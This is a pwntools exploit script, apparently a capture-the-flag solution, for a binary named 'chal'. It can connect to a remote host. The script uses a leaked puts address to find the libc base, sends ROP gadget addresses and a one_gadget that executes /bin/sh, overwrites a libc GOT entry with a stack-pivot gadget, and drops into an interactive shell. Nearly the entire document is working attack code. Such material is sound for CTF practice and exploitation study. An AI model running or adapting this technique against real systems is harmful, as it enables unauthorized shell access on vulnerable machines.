#!/usr/bin/env python3
# Local Ubuntu 22.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./chal"
elf  = ELF(BINARY, checksec=False)

def Connect():
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "172.31.2.2"
    PORT = 36902
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)
  return s 

s = Connect()
s.recvuntil(b"Gift : ")
libc = elf.libc
puts_addr = int(s.recvuntil(b"\n"), 16)
libc_base = puts_addr - libc.sym.puts
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

pop_rax_rdx_rbx_ret = libc_base + 0x904a8  #: pop rax; pop rdx; pop rbx; ret;
one_gadget = libc_base + 0xebd3f # execve("/bin/sh", rbp-0x50, [rbp-0x70])

s.sendafter(b"> ", p64(pop_rax_rdx_rbx_ret))
s.sendafter(b"> ", p64(0))
s.sendafter(b"> ", p64(one_gadget))

libc_got_addr = libc_base + (0x7ffff7f96098 - 0x00007ffff7d7c000)
s.sendlineafter(b"> ", hex(libc_got_addr).encode())
add_rsp_0x58_ret = libc_base + 0xa0265 #: add rsp, 0x58; ret;
s.sendlineafter(b"> ", p64(add_rsp_0x58_ret))

s.interactive()  

